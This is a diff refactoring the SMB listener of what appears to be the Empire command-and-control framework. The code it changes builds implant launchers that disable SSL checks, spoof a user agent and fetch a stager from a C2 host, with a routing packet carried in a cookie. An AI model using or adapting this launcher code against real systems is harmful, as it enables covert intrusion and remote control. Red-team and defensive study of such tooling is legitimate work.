@@ -4,7 +4,7 @@ import logging
 import os
 import random
 
-from empire.server.common import encryption, helpers, packets, templating
+from empire.server.common import helpers, packets, templating
 from empire.server.common.empire import MainMenu
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import listener_util
@@ -56,7 +56,7 @@ class Listener:
         # required:
         self.mainMenu = mainMenu
         self.threads = {}  # used to keep track of any threaded instances of this server
-
+        self.host_address = None
         self.instance_log = log
 
     def default_response(self):
@@ -96,12 +96,8 @@ class Listener:
             log.error("listeners/template generate_launcher(): no language specified!")
             return None
 
-        active_listener = self
-        listenerOptions = active_listener.options
-
-        host = listenerOptions["Host"]["Value"]
-        stagingKey = listenerOptions["StagingKey"]["Value"]
-        profile = listenerOptions["DefaultProfile"]["Value"]
+        stagingKey = self.options["StagingKey"]["Value"]
+        profile = self.options["DefaultProfile"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         customHeaders = profile.split("|")[2:]
@@ -114,7 +110,7 @@ class Listener:
 
         if language in ["ironpython"]:
             launcherBase = "import sys;"
-            if "https" in host:
+            if "https" in self.host_address:
                 # monkey patch ssl woohooo
                 launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
@@ -126,12 +122,14 @@ class Listener:
                 log.error(p, exc_info=True)
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
 
             launcherBase += "import urllib.request;\n"
             launcherBase += f"UA='{user_agent}';"
-            launcherBase += f"server='{host}';t='{stage0}';hop='{listener_name}';"
+            launcherBase += (
+                f"server='{self.host_address}';t='{stage0}';hop='{listener_name}';"
+            )
 
             # prebuild the request routing packet for the launcher
             routingPacket = packets.build_routing_packet(
@@ -145,7 +143,7 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
             launcherBase += "req=urllib.request.Request(server+t);\n"
-            # add the RC4 packet to a cookie
+            # add the routing packet to a cookie
             launcherBase += "req.add_header('User-Agent',UA);\n"
             launcherBase += (
                 f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
@@ -164,7 +162,7 @@ class Listener:
                 if proxy.lower() == "default":
                     launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                 else:
-                    proto = proxy.Split(":")[0]
+                    proto = proxy.split(":")[0]
                     launcherBase += (
                         "proxy = urllib.request.ProxyHandler({'"
                         + proto
@@ -236,12 +234,7 @@ class Listener:
             log.error("generate_stager(): no language specified!")
             return None
 
-        with SessionLocal() as db:
-            agent = self.mainMenu.agentsv2.get_by_name(db, self.parent_agent)
-            host = agent.internal_ip
-
         pipe_name = listenerOptions["PipeName"]["Value"]
-        listenerOptions["Name"]["Value"]
         profile = listenerOptions["DefaultProfile"]["Value"]
         uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
         stagingKey = listenerOptions["StagingKey"]["Value"]
@@ -274,7 +267,7 @@ class Listener:
                 "profile": profile,
                 "stage_1": stage1,
                 "stage_2": stage2,
-                "host": host,
+                "host": self.host_address,
                 "pipe_name": pipe_name,
             }
             stager = template.render(template_options)
@@ -285,12 +278,7 @@ class Listener:
             # base64 encode the stager and return it
             if encode:
                 return base64.b64encode(stager)
-            if encrypt:
-                # return an encrypted version of the stager ("normal" staging)
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
-                )
+
             # otherwise return the standard stager
             return stager
 
@@ -369,10 +357,6 @@ class Listener:
 
         This should be implemented for the module.
         """
-        with SessionLocal() as db:
-            agent = self.mainMenu.agentsv2.get_by_name(db, self.parent_agent)
-            host = agent.internal_ip
-
         pipe_name = listenerOptions["PipeName"]["Value"]
 
         if not language:
@@ -394,7 +378,7 @@ class Listener:
             template = eng.get_template("smb/comms.py")
 
             template_options = {
-                "host": host,
+                "host": self.host_address,
                 "pipe_name": pipe_name,
             }
 
